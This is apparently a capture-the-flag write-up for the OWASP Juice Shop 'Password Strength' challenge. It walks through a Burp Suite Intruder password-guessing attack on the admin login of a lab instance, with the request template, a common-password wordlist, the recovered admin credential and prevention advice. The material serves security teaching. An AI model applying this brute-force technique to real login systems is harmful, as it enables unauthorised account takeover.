# OWASP Juice Shop – Password Strength

## Category :

**Broken Authentication**

### Challenge Name

**Password Strength**

### Difficulty

**2 Star**

## Objective

- Log in with the administrator's user credentials **without changing the password first** and **without using SQL Injection**.

## Description

- This challenge demonstrates weak password security on privileged accounts.  
- The administrator uses a predictable password that can be discovered through common password testing.

## Method Used

- Password guessing against the login request in a **lab environment** using **Burp Suite Intruder**.


## Target Account

```text id="u3f8mk"
admin@juice-sh.op
````

## Login Endpoint

```text
/rest/user/login
```

## Base Request Sent to Intruder

```http
POST /rest/user/login HTTP/1.1
Host: 192.168.1.122:3000
Content-Type: application/json

{
  "email":"admin@juice-sh.op",
  "password":"§1234§"
}
```

## Intruder Configuration

### Attack Type

```text
Sniper
```

### Payload Position

```json
"password":"§1234§"
```

## Sample Wordlist

```text
admin123
admin@123
password123
welcome123
changeme123
letmein123
root123
default123
master123
passw0rd
Admin@123
```


## Successful Response Indicator

- Look for:

```text
HTTP/1.1 200 OK
```

>or a successful login token in the response body.

## Correct Credentials Found

```text
Email: admin@juice-sh.op
Password: admin123
```

## Successful Request

```http
POST /rest/user/login HTTP/1.1
Host: 192.168.1.122:3000
Content-Type: application/json

{
  "email":"admin@juice-sh.op",
  "password":"admin123"
}
```

## Why It Works

- The administrator password is weak and follows a common pattern:

```text
admin + 123
```

>This makes it guessable.


## Vulnerability Type

### Broken Authentication

- Weak passwords on administrative accounts enable unauthorized access.

## Impact

- Admin account compromise
    
- Access to administration panel
    
- Sensitive data exposure
    
- Privilege escalation
    
- Full application control

## Severity

**Critical**

## Root Cause

- Weak password policy
    
- Common password allowed
    
- No MFA
    
- Inadequate login protections

## Prevention

- Enforce strong passwords
    
- Block common passwords
    
- Enable MFA for admins
    
- Add rate limiting / lockouts
    
- Monitor repeated login attempts

## Key Lesson

- A single weak admin password can undermine the entire application.

## Conclusion

- This challenge highlights the risk of predictable credentials on privileged accounts.
